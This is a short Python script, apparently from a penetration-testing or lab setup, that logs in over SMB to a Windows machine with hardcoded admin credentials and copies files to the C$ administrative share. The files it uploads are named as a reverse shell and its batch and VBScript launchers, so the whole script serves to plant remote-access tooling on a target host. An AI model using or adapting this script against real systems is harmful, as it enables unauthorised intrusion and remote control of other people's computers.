# file_transfer.py
from smb.SMBConnection import SMBConnection

def upload_files(ip_address, username, password, domain, file_paths):
    """Upload files to the specified IP address."""
    conn = SMBConnection(username, password, "KaliLinux", "WindowsPC", domain=domain, use_ntlm_v2=True)
    conn.connect(ip_address, 139)

    share_name = 'C$'  # Common administrative share on Windows
    for file_path in file_paths:
        with open(file_path, 'rb') as file_obj:
            conn.storeFile(share_name, file_path.split('/')[-1], file_obj)

    conn.close()

if __name__ == "__main__":
    ip_address = '192.168.0.105'
    username = 'admin'
    password = 'password'
    domain = 'WORKGROUP'
    file_paths = ['reverse_shell.py', 'run_script.bat', 'run_script.vbs']
    upload_files(ip_address, username, password, domain, file_paths)
